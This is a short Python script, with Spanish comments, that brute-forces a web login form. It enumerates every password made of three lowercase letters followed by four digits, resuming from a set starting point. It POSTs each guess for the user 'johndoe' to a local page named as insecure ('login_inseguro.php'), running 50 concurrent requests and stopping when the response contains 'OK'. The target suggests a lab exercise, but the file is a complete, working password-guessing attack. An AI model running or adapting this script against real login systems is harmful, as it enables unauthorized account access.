import asyncio
import aiohttp
import itertools

URL = "http://localhost:8080/login_inseguro.php"
USERNAME = "johndoe"
LETTERS = "abcdefghijklmnopqrstuvwxyz"
START = "pwc0000"
MAX_CONCURRENT_REQUESTS = 50  # no más de 100 en local

# Generador asincrónico
def generate_passwords(start="aaa0000"):
    start_letters = start[:3]
    start_number = int(start[3:])
    skipping = True

    for letters_part in itertools.product(LETTERS, repeat=3):
        prefix = ''.join(letters_part)
        if skipping:
            if prefix == start_letters:
                skipping = False
            else:
                continue

        for number in range(10000):
            if skipping and number < start_number:
                continue
            skipping = False
            yield f"{prefix}{number:04d}"

# Petición asíncrona
async def try_password(session, password, semaphore):
    async with semaphore:
        try:
            async with session.post(URL, data={"loginName": USERNAME, "password": password}) as resp:
                text = await resp.text()
                if "OK" in text:
                    print(f"[✓] ¡Contraseña encontrada!: {password}")
                    return password
                else:
                    print(f"[-] {password}")
        except Exception as e:
            print(f"[!] Error con {password}: {e}")
    return None

async def main():
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for password in generate_passwords(START):
            task = asyncio.create_task(try_password(session, password, semaphore))
            tasks.append(task)

            if len(tasks) >= MAX_CONCURRENT_REQUESTS:
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                for d in done:
                    if d.result():
                        # Cancela tareas pendientes si se encuentra la contraseña
                        for p in pending:
                            p.cancel()
                        return
                tasks = list(pending)

# Ejecutar
if __name__ == "__main__":
    asyncio.run(main())
